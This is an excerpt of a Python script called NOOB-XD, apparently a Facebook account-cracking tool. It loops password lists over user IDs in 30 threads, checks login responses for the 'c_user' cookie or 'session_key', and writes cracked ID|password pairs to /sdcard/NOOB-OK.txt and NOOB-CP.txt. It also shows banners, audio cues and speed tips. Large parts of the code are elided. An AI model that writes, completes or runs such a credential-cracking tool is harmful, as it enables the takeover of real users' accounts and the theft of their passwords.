...
def menu_apikey():
  ...
  os.system(f" clear")                          
  print(f"""\x1b[1;97m
\033[1;33md8b   db  .d88b.   .d88b.  d8888b. 
\033[1;37m888o  88 .8P  Y8. .8P  Y8. 88  `8D \033[1;33m𝗡\033[1;37m
\033[1;37m88V8o 88 88    88 88    88 88oooY' \033[1;34m𝗢\033[1;37m
\033[1;37m88 V8o88 88    88 88    88 88~~~b. \033[1;35m𝗢\033[1;37m
\033[1;37m88  V888 `8b  d8' `8b  d8' 88   8D \033[1;36m𝗕\033[1;37m
\033[1;34mVP   V8P  `Y88P'   `Y88P'  Y8888P'


\033[1;37m------------------------------------------------
 Author    :) NOOB
 Facebook  :) ARFAN AHAMED RAFI
 Tool Name :) NOOB-XD
 Version   :) 2.1 [VIP]
\033[1;37m------------------------------------------------""")                              
...
os.system("clear")
print(logo)
b = (f"welcome to noob file cloning command")
...
def Noob():
	...
	if me in ["1", "01","11","A","a"]:
		clear()
		file = (f"put file path")
		create_audio(file,"test.mp3")
		play_audio("test.mp3")
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\033[38;5;208m Use flight mode for speed up\033[1;37m")
			print(" Todays Date : "+date)
			print(" \033[1;37mCracking Start at : "+time.strftime("%H:%M")+" "+ tag)
			linex()
			for user in fo:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [NOOB/M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                ok = (f"noobok")
                                create_audio(ok,"test.mp3")
                                play_audio("test.mp3")
                                print(f'\r\r\033[1;32m [NOOB-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/NOOB-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                   #     print(f'\r\r\x1b[38;5;208mm [NOOB-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/NOOB-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [NOOB/M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def ffb3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [NOOB-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [NOOB-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/NOOB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[NOOB-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
		#		print('\033[1;91m[NOOB-CP] '+idf+' | '+ps+'\033[0;97m')
